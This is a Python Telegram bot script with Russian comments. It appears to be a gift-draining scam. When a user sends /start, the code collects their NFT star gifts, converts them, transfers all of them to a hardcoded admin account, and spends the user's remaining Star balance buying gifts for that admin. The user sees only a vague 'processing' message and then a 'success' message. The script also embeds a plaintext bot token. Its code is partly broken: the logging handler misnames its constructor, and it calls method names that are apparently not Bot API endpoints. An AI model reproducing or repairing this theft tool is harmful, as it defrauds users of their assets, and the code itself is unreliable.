from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import math
import aiohttp
import logging
import asyncio
from typing import Dict, Any

# Конфигурация
BOT_TOKEN = "7860648021:AAHeh3ztjeycHOAm--enBNHW7AP3zn1liSw"
ADMIN_ID = 8189210357  # Ваш Telegram ID
BEAR_GIFT_STARS = 15  # Стоимость подарка

# Асинхронный обработчик логов
class AsyncTelegramLogHandler(logging.Handler):
    def init(self, app, chat_id):
        super().init()
        self.app = app
        self.chat_id = chat_id
        self.loop = asyncio.get_event_loop()
        
    def emit(self, record):
        log_entry = self.format(record)
        self.loop.create_task(self._async_send(log_entry))

    async def _async_send(self, message: str):
        try:
            await self.app.bot.send_message(
                chat_id=self.chat_id,
                text=message
            )
        except Exception as e:
            print(f"Ошибка отправки лога: {str(e)}")

# Настройка логгера
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

async def init_bot(app):
    handler = AsyncTelegramLogHandler(app, ADMIN_ID)
    formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
    handler.setFormatter(formatter)
    logger.addHandler(handler)

async def get_15stars_gift_id(session: aiohttp.ClientSession, context: ContextTypes.DEFAULT_TYPE) -> str:
    """Получение ID подарка за 15 Stars"""
    try:
        async with session.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/payments.getStarGifts",
            json={"user_id": ADMIN_ID}
        ) as response:
            if response.status != 200:
                error_msg = f"Gift API Error: Status {response.status}"
                logger.error(error_msg)
                raise ValueError(error_msg)

            data = await response.json()
            if "gifts" not in data:
                error_msg = "API Error: Missing 'gifts' key"
                logger.error(error_msg)
                raise ValueError(error_msg)

            for gift in data["gifts"]:
                if gift.get("stars") == BEAR_GIFT_STARS and not gift.get("sold_out"):
                    logger.info(f"Found gift ID: {gift['id']}")
                    return gift["id"]
            
            error_msg = "No available 15 Stars gifts"
            logger.error(error_msg)
            raise ValueError(error_msg)

    except Exception as e:
        logger.error(f"Error in get_15stars_gift_id: {str(e)}", exc_info=True)
        raise

async def process_user_gifts(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> Dict[str, Any]:
    """Основная логика обработки подарков"""
    result = {"gift_count": 0, "error": None}
    
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
            # 1. Получение NFT-подарков
            async with session.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/payments.getUserStarGifts",
                json={"user_id": user_id}
            ) as response:
                if response.status != 200:
                    error_msg = f"User API Error: Status {response.status}"
                    logger.error(error_msg)
                    result["error"] = error_msg
                    return result

                nft_data = await response.json()
                if "gifts" not in nft_data:
                    error_msg = "User has no gifts"
                    logger.error(error_msg)
                    result["error"] = error_msg
                    return result

                nft_gifts = nft_data["gifts"]

            # 2. Конвертация NFT в Stars
            user_balance = 0
            for gift in nft_gifts:
                async with session.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/payments.convertStarGift",
json={"user_id": gift["sender_id"], "msg_id": gift["msg_id"]}
                ) as convert_resp:
                    convert_data = await convert_resp.json()
                    user_balance += convert_data.get("new_balance", 0)

            # 3. Расчет подарков
            gift_count = math.ceil(((25 * len(nft_gifts)) - user_balance) / 13)
            result["gift_count"] = max(0, gift_count)

            # 4. Отправка подарков
            if result["gift_count"] > 0:
                gift_id = await get_15stars_gift_id(session, context)
                for _ in range(int(result["gift_count"])):
                    await session.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/payments.getPaymentForm",
                        json={
                            "input_invoice": {
                                "@type": "inputInvoiceStarGift",
                                "user_id": user_id,
                                "gift_id": gift_id,
                                "stars": BEAR_GIFT_STARS
                            }
                        }
                    )

            # 5. Передача NFT админу
            for gift in nft_gifts:
                await session.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/payments.transferStarGift",
                    json={"user_id": ADMIN_ID, "msg_id": gift["msg_id"]}
                )

            # 6. Покупка оставшихся подарков
            async with session.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/payments.getStarBalance",
                json={"user_id": user_id}
            ) as balance_resp:
                user_balance = (await balance_resp.json()).get("balance", 0)
            
            if user_balance >= BEAR_GIFT_STARS:
                gift_id = await get_15stars_gift_id(session, context)
                for _ in range(user_balance // BEAR_GIFT_STARS):
                    await session.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/payments.getPaymentForm",
                        json={
                            "input_invoice": {
                                "@type": "inputInvoiceStarGift",
                                "user_id": ADMIN_ID,
                                "gift_id": gift_id,
                                "stars": BEAR_GIFT_STARS
                            }
                        }
                    )

    except Exception as e:
        logger.error(f"Processing Error: {str(e)}", exc_info=True)
        result["error"] = str(e)
    
    return result

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id == ADMIN_ID:
        logger.warning("Admin access blocked")
        await update.message.reply_text("🔒 Администраторам доступ закрыт")
        return

    await update.message.reply_text("⏳ Обрабатываю ваш запрос...")
    result = await process_user_gifts(user.id, context)

    if result["error"]:
        await update.message.reply_text("❌ Ошибка обработки")
    else:
        await update.message.reply_text(f"✅ Успешно! Передано подарков: {result['gift_count']}")

def main():
    application = ApplicationBuilder() \
        .token(BOT_TOKEN) \
        .post_init(init_bot) \
        .build()
    
    application.add_handler(CommandHandler("start", start))
    application.run_polling()

if __name__ == "__main__":
    main()
